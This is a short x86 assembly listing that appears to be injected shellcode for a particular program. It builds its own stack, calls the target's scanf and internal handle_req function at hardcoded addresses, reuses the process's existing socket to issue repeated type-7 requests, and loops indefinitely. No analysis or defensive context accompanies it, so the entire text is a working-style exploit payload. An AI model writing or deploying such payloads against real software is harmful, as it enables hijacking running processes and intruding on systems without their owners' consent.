//create new stack start:
sub esp, 17000
mov ebp, esp

sub esp, 16500
sub esp, 500

//scanf("%[^\n]s\n", path);
lea eax, [ebp-17000]
push eax
//use existing format string...
mov eax, 0x62506168
push eax
mov eax, 0x62504bd4
call eax
cmp eax, 1
jne 0x0fffffff
pop eax
pop eax

//handle_req(socket_ptr, cmd_type_num, request_content_buf, srv_output_buf, silent_mode);
mov eax, 0 #silent_mode
push eax
lea eax, [ebp-16500] #srv_output_buf
push eax
lea eax, [ebp-17000] #request_content_buf
push eax
mov eax, 7 #cmd_type_num
push eax
mov eax, [0x005ffd90] #socket_ptr
push eax
mov eax, 0x62501892
call eax
sub esp, 20

add esp, 500
add esp, 16500
add esp, 17000

jmp -300